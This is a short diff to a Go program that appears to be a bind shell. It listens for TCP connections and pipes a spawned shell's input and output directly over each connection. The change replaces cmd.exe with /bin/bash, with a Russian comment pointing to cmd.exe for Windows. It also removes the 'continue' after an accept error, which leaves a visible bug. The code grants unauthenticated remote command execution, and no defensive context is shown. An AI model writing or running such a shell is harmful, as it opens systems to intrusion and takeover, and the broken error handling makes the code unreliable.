@@ -18,7 +18,6 @@ func main() {
 		conn, err := listener.Accept()
 		if err != nil {
 			fmt.Println("Error:", err)
-			continue
 		}
 
 		go handle(conn)
@@ -28,7 +27,7 @@ func main() {
 func handle(conn net.Conn) {
 	defer conn.Close()
 
-	cmd := exec.Command("cmd.exe")
+	cmd := exec.Command("/bin/bash") // или Command("cmd.exe") для windows
 
 	cmd.Stdin = conn
 	cmd.Stdout = conn
